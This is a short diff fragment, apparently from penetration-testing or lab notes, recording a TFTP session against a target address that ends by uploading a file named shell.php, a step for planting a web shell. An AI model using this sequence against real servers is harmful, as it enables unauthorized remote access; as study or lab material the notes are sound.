@@ -1,0 +1,6 @@
+tftp $ip
+tftp> ls
+?Invalid command
+tftp> verbose
+Verbose mode on.
+tftp> put shell.php
